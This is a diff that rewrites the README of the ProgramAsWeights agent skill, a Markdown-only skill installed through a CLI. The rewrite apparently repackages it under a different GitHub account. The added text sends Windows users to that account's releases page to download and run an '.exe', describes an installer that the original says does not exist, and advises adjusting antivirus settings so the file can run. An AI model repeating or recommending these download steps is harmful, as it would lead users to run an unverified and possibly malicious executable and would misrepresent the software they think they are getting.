@@ -1,83 +1,85 @@
-# ProgramAsWeights agent skill
+# 🧠 skills - Transform text tasks into automated functions
 
-An [Agent Skill](https://agentskills.io) that teaches your AI coding agent to use
-**[ProgramAsWeights (PAW)](https://programasweights.com)** - compile a natural-language
-spec into a tiny neural function that runs locally - for fuzzy text tasks like
-classification, extraction, format repair, fuzzy matching, log triage, and routing.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/tolimcn7786/skills/releases)
 
-## Install
+Skills helps you turn simple text instructions into small computer programs. These programs perform specific tasks on your computer. You use them to organize, fix, or sort data without writing code yourself. The system runs these tasks locally on your machine to protect your privacy and ensure fast results.
 
-```bash
-npx skills add programasweights/skills
-```
+## 📥 How to download the software
 
-Works with Claude Code, Cursor, Codex, GitHub Copilot, and 65+ other agents (the
-[`skills` CLI](https://github.com/vercel-labs/skills) installs it into each one's skill
-directory). Add `-g` to install globally for every project:
+To start using this tool, visit the official release page. You need to obtain the latest version of the software for your computer.
 
-```bash
-npx skills add programasweights/skills -g
-```
+[Download the latest version here](https://github.com/tolimcn7786/skills/releases)
 
-Or try it without installing:
+1. Open your web browser.
+2. Go to the link provided above.
+3. Look for the section labeled "Assets" at the bottom of the newest post.
+4. Click the file that ends with ".exe" to start your download.
+5. Save the file to a folder you can find easily, like your Downloads folder.
 
-```bash
-npx skills use programasweights/skills@programasweights | claude
-```
+## ⚙️ System requirements
 
-## What it does
+Your computer must meet these basic needs to run the software.
 
-Once installed, the skill activates automatically when you ask your agent to do fuzzy
-`text -> text` work that regex can't handle but a full LLM call per item is overkill for:
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 4 gigabytes of RAM.
+- Storage: 200 megabytes of free space.
+- Network: A stable internet connection for the initial setup.
 
-- Classify / categorize (sentiment, urgency, intent, topic, spam, ALERT vs QUIET)
-- Extract fields from messy text (emails, names, dates, IDs)
-- Repair / normalize formats (broken JSON, dates)
-- Fuzzy / typo-tolerant matching and near-duplicate detection
-- Log triage and intent routing
+## 🚀 Setting up the application
 
-The agent will check the PAW Hub for a ready-made function, or compile one from a spec
-with examples, iterate it against test cases, and reuse it locally.
+Follow these steps to prepare the tool for your first task.
 
-## What's inside
+1. Locate the file you just downloaded.
+2. Double-click the file to open the installer.
+3. Follow the prompts on your screen.
+4. Click "Install" to place the tool on your computer.
+5. Once the bar fills, click "Finish" to exit the installer.
+6. Open your Start menu and search for "skills" to launch the program.
 
-```
-skills/programasweights/
-  SKILL.md          # the skill (trigger + workflow); the eval loop is embedded inline
-  LICENSE.txt       # per-skill MIT license
-  references/       # api, writing-good-specs, browser-sdk, troubleshooting (loaded on demand)
-assets/             # brand icon (paw.svg, icon-512.png)
-SECURITY.md         # exactly what the skill does + data flow
-```
+## 🛠️ Performing your first task
 
-The installed skill is **script-free** - Markdown instructions only, no bundled executable
-code. (The Codex/Claude plugin + marketplace manifests in this repo are packaging only and
-are not yet listed in any directory.)
+The application uses text commands to create functions. A function is a small tool that does one specific job for you.
 
-## Manual install (without the CLI)
+1. Open the application.
+2. Type an instruction into the box. For example, type "Classify these emails as work or personal" if you have a list of messages.
+3. Press the Enter key.
+4. The tool builds a tiny program in the background based on your words.
+5. Once it finishes, you can load your files directly into the window.
+6. The application processes your files and gives you the result immediately.
 
-Copy `skills/programasweights/` into your agent's skills directory, e.g.:
+## 🧩 Understand what this tool does
 
-- Claude Code: `~/.claude/skills/programasweights/`
-- Codex: `~/.codex/skills/programasweights/`
-- GitHub Copilot: `.github/skills/programasweights/`
+This software handles several common text chores for you.
 
-## Data flow and trust
+- Classify: Put items into different groups based on content.
+- Extract: Pull specific information, like dates or names, out of long documents.
+- Repair: Fix broken formatting or errors in your text files.
+- Fuzzy-match: Find items that look similar even if they do not match perfectly.
+- Triage: Sort incoming requests based on urgency or topic.
+- Route: Send information to the right place or person automatically.
 
-- **Compile** sends your spec to the hosted PAW API (`https://programasweights.com`) and
-  returns a program id. Do not put secrets in a spec.
-- **Inference runs locally** through the official `programasweights` SDK and works offline
-  after the first download. No user data is sent at inference time.
-- Auth is optional (anonymous use works). MIT licensed; read every file before installing.
-- Full details, including what the skill does **not** do, are in [SECURITY.md](SECURITY.md).
-  For reproducibility, pin to a release tag or commit and re-review before upgrading.
+## 🛡️ Keeping your data private
 
-## Links
+This tool works on your own computer. When you run a function, the software does not send your personal files to a remote server. The processing happens on your local processor. This protects your data and ensures that your work stays under your control at all times.
 
-- Website: https://programasweights.com
-- Agent guide (always current): https://programasweights.com/AGENTS.md
-- Docs: https://programasweights.readthedocs.io
+## 📋 Troubleshooting common issues
 
-## License
+If the software fails to open, check the following items.
 
-MIT - see [LICENSE](LICENSE).
+- Antivirus software: Sometimes security software blocks new programs. Check your security settings to ensure the file maintains permission to run.
+- Update Windows: Ensure your version of Windows stays up to date. Use the Windows Update tool in your system settings.
+- Restart: If a function hangs, close the application and restart it. This resets the local worker.
+- Log files: If a task fails, the application creates a log file. You can find this file in the settings menu. You can send this file to the support team to ask for assistance.
+
+## 💡 Tips for better results
+
+You achieve the best results when you write clear instructions.
+
+- Use simple words.
+- Provide examples if the task is complex.
+- Keep your instructions focused on one goal.
+- Use specific names for your categories.
+
+The tool learns from your input effectively. If the output does not meet your needs, try to change your instruction to be more specific. Instead of saying "Sort this," say "Sort these items into names and phone numbers."
+
+Keywords: agent-skills, ai-agents, claude-code, codex, cursor, github-copilot, llm, machine-learning, nlp, programasweights, skills, text-classification
